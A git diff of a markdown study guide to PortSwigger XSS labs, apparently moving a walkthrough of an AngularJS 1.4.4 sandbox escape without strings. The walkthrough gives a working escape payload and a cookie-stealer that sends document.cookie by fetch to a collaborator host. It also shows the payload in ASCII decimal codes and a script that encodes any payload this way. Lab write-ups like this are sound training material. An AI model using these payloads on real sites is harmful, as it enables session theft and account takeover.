@@ -161,86 +161,6 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 [z3nsh3ll give an amazingly detail understanding on the constructor vulnerability in this lab on YouTube](https://youtu.be/QpQp2JLn6JA)  
 
-### AngularJS sandbox Escape  
-
->Expert PortSwigger Lab exercise using AngularJS 1.4.4 and versions 1.x has reached end of life and is no longer maintained.  
->This lab uses **AngularJS** in an unusual way where the `$eval` function is not available and you will be unable to use any strings in AngularJS.  
->Objective, perform a cross-site scripting attack that escapes the sandbox and executes the payload without using the `$eval` function.  
-
-[z3nsh3ll - YouTube Video give a great explanation of this Reflected XSS with AngularJS Sandbox Escape Without Strings](https://youtu.be/gKLHVT67sU0?si=tqQMb5Y6xLA-jgR4)  
-
->***Identify*** the `angular.module` in JavaScript source code:  
-
-![angularJS-sandbox-escape-identify.png](/images/angularJS-sandbox-escape-identify.png)  
-
->The `key` variable value `search` is injected into the JavaScript created dynamically.  
->No obvious security issue present here. However, the security of this code depends on how this controller and the extracted values are used in the back-end.  
-
->The `$parse` method evaluates the AngularJS expression `$scope.query`.  
-
->Using the `&` to add second key value pair to test payload dynamic code generated.  
-
-![angularJS-sandbox-escape-add-2nd-key pair](/images/angularJS-sandbox-escape-add-2nd-keypair.png)  
-
->Changing the second added key value name to expression to determine if evaluated, `/?search=key1value&7*7=payload` and math result is 49.  
-
-![angularJS-sandbox-escape-2nd-key pair-eval](/images/angularJS-sandbox-escape-2nd-keypair-eval.png)  
-
->Constructing a payload fails when using `alert()` as the second key name in how angularJS compile the code through the parser.  
-
->[AngulaJS sandbox - See PortSwigger Client-Side template injection documents](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection)  
-
->[PortSwigger CheatSheet Reference Sandbox 1.4.4 escape](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.4.4-(without-strings))  
-
-```
-1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
-```
-
->Collaborator payload ***cookie stealer***:  
-
-```
-x=fetch('https://m9w8haeauh0frftrtjdvexkyrpxgl69v.oastify.com/?z='+document.cookie)
-```
-
->The ASCII decimal values for each character in the above payload string, separated by commas. Each number represents the ASCII decimal value of the corresponding character in the payload string.  
-
-```
-120,61,102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,103,112,57,111,49,56,57,51,106,97,107,49,100,122,101,55,117,116,118,50,114,107,118,114,48,105,54,57,117,122,105,111,46,111,97,115,116,105,102,121,46,99,111,109,47,63,122,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41
-```  
-
->Python script to convert any payload to ASCIII decimal values:  
-
-```python
-import sys
-
-print('Python String to ASCII Converter!')
-if len(sys.argv) != 2:
-    print("Usage: Python ascii_converter.py 'Payload_String'")
-    sys.exit(1)
-
-input_string = sys.argv[1]
-ascii_values = [str(ord(char)) for char in input_string]
-
-output = ",".join(ascii_values)
-print(output)
-print('PortSwigger Expert Academy Labs!')
-```  
-
-![python-script-ascii_converter.png](/images/python-script-ascii_converter.png)  
-
->Cookie Stealer Payload in ASCII decimal value AngularJS expression run through sandbox, from the PortSwigger solution steps:
-
-1. The exploit uses `toString()` to create a string without using quotes.
-2. Then gets the String prototype and overwrites the `charAt` function for every string.
-3. This breaks the AngularJS sandbox. allow an array passed to the `orderBy` filter.
-4. Set the argument for the filter by again using `toString()` to create a string and the String constructor property.
-5. Finally, use the `fromCharCode` method generate our payload by converting character codes into the payload example `x=alert(1)`.  
-6. The `charAt` function has been overwritten, AngularJS will allow this code to escape the **Sandbox**.  
-
-![angularJS-sandbox-escape-cookie-stealer](/images/angularJS-sandbox-escape-cookie-stealer.png)  
-
->[PortSwigger Expert Lab: Reflected XSS with AngularJS sandbox escape without strings](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings)  
-
 ### Doc Write Location search  
 
 >The target is vulnerable to DOM-XSS in the stock check function. `source code` reveal ```document.write``` is the sink used with ```location.search``` allowing us to add **storeId** query parameter with a value containing the JavaScript payload inside a ```<select>``` statement.  
@@ -422,6 +342,7 @@ I am unable to get a working cookie stealer payload for this vulnerable lab.....
 [OnHashChange](#onhashchange)  
 [Reflected String XSS](#reflected-string-xss)  
 [Reflected String Extra Escape](#reflected-string-extra-escape)  
+[AngularJS Sandbox Escape](#angularjs-sandbox-escape)  
 [XSS Template Literal](#xss-template-literal)  
 [XSS via JSON into EVAL](#xss-via-json-into-eval)  
 [Stored XSS](#stored-xss)  
@@ -669,6 +590,86 @@ fuzzer\';alert(`Testing The backtick a typographical mark used mainly in computi
   
 [PortSwigger Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)  
   
+### AngularJS Sandbox Escape  
+
+>Expert PortSwigger Lab exercise using AngularJS 1.4.4 and versions 1.x has reached end of life and is no longer maintained.  
+>This lab uses **AngularJS** in an unusual way where the `$eval` function is not available and you will be unable to use any strings in AngularJS.  
+>Objective, perform a cross-site scripting attack that escapes the sandbox and executes the payload without using the `$eval` function.  
+
+[z3nsh3ll - YouTube Video give a great explanation of this Reflected XSS with AngularJS Sandbox Escape Without Strings](https://youtu.be/gKLHVT67sU0?si=tqQMb5Y6xLA-jgR4)  
+
+>***Identify*** the `angular.module` in JavaScript source code:  
+
+![angularJS-sandbox-escape-identify.png](/images/angularJS-sandbox-escape-identify.png)  
+
+>The `key` variable value `search` is injected into the JavaScript created dynamically.  
+>No obvious security issue present here. However, the security of this code depends on how this controller and the extracted values are used in the back-end.  
+
+>The `$parse` method evaluates the AngularJS expression `$scope.query`.  
+
+>Using the `&` to add second key value pair to test payload dynamic code generated.  
+
+![angularJS-sandbox-escape-add-2nd-key pair](/images/angularJS-sandbox-escape-add-2nd-keypair.png)  
+
+>Changing the second added key value name to expression to determine if evaluated, `/?search=key1value&7*7=payload` and math result is 49.  
+
+![angularJS-sandbox-escape-2nd-key pair-eval](/images/angularJS-sandbox-escape-2nd-keypair-eval.png)  
+
+>Constructing a payload fails when using `alert()` as the second key name in how angularJS compile the code through the parser.  
+
+>[AngulaJS sandbox - See PortSwigger Client-Side template injection documents](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection)  
+
+>[PortSwigger CheatSheet Reference Sandbox 1.4.4 escape](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.4.4-(without-strings))  
+
+```
+1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+```
+
+>Collaborator payload ***cookie stealer***:  
+
+```
+x=fetch('https://m9w8haeauh0frftrtjdvexkyrpxgl69v.oastify.com/?z='+document.cookie)
+```
+
+>The ASCII decimal values for each character in the above payload string, separated by commas. Each number represents the ASCII decimal value of the corresponding character in the payload string.  
+
+```
+120,61,102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,103,112,57,111,49,56,57,51,106,97,107,49,100,122,101,55,117,116,118,50,114,107,118,114,48,105,54,57,117,122,105,111,46,111,97,115,116,105,102,121,46,99,111,109,47,63,122,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41
+```  
+
+>Python script to convert any payload to ASCIII decimal values:  
+
+```python
+import sys
+
+print('Python String to ASCII Converter!')
+if len(sys.argv) != 2:
+    print("Usage: Python ascii_converter.py 'Payload_String'")
+    sys.exit(1)
+
+input_string = sys.argv[1]
+ascii_values = [str(ord(char)) for char in input_string]
+
+output = ",".join(ascii_values)
+print(output)
+print('PortSwigger Expert Academy Labs!')
+```  
+
+![python-script-ascii_converter.png](/images/python-script-ascii_converter.png)  
+
+>Cookie Stealer Payload in ASCII decimal value AngularJS expression run through sandbox, from the PortSwigger solution steps:
+
+1. The exploit uses `toString()` to create a string without using quotes.
+2. Then gets the String prototype and overwrites the `charAt` function for every string.
+3. This breaks the AngularJS sandbox. allow an array passed to the `orderBy` filter.
+4. Set the argument for the filter by again using `toString()` to create a string and the String constructor property.
+5. Finally, use the `fromCharCode` method generate our payload by converting character codes into the payload example `x=alert(1)`.  
+6. The `charAt` function has been overwritten, AngularJS will allow this code to escape the **Sandbox**.  
+
+![angularJS-sandbox-escape-cookie-stealer](/images/angularJS-sandbox-escape-cookie-stealer.png)  
+
+>[PortSwigger Expert Lab: Reflected XSS with AngularJS sandbox escape without strings](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings)  
+
 ### XSS Template Literal  
 
 >JavaScript template literal is ***identified*** by the back ticks **`** used to contain the string. On the target code we ***identify*** the search string is reflected inside a template literal string.  
